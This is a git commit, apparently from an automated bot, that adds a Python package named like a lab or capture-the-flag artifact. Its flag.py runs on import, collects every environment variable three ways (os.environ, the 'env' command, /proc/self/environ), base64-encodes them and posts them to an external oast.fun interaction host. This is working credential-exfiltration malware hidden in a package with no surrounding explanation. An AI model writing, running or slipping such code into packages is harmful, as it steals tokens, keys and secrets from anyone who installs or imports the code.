33fcc1b46541c2584ab54a364382ac820e2afff3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-11-10 05:05:12 +0000

    Add package artifact-lab-3-package-736f752d/0.1.3/artifact_lab_3_package_736f752d-0.1.3.tar.gz

---
+++ packages/artifact-lab-3-package-736f752d/artifact_lab_3_package_736f752d-0.1.3.tar.gz/artifact_lab_3_package_736f752d-0.1.3/artifact-lab-3-package-736f752d/flag.py
@@ -0,0 +1,30 @@
+import os
+import subprocess
+import base64
+import requests
+
+def hello():
+    headerOS = {"x-test":"os.environ"}
+    url = "http://csnr59g8cumhnf5tp4f0icgnzge434rpa.oast.fun"
+    env = str(os.environ)
+    benv = env.encode("ascii")
+    b64envb = base64.b64encode(benv)
+    b64env = b64envb.decode("ascii")
+    data = {"vars": b64env}
+    req1 = requests.post(url, data=data, headers=headerOS, timeout=20)
+    headerSub = {"x-test":"sub.call('env')"}
+    env = str(subprocess.call("env"))
+    benv = env.encode("ascii")
+    b64envb = base64.b64encode(benv)
+    b64env = b64envb.decode("ascii")
+    data = {"vars": b64env}
+    req = requests.post(url, data=data, headers=headerSub, timeout=20)
+    headerEnviron = {"x-test":"Proc/Environ"}
+    env = str(subprocess.call(["cat", "/proc/self/environ"]))
+    benv = env.encode("ascii")
+    b64envb = base64.b64encode(benv)
+    b64env = b64envb.decode("ascii")
+    data = {"vars": b64env}
+    req2 = requests.post(url, data=data, headers=headerEnviron, timeout=20)
+
+hello()
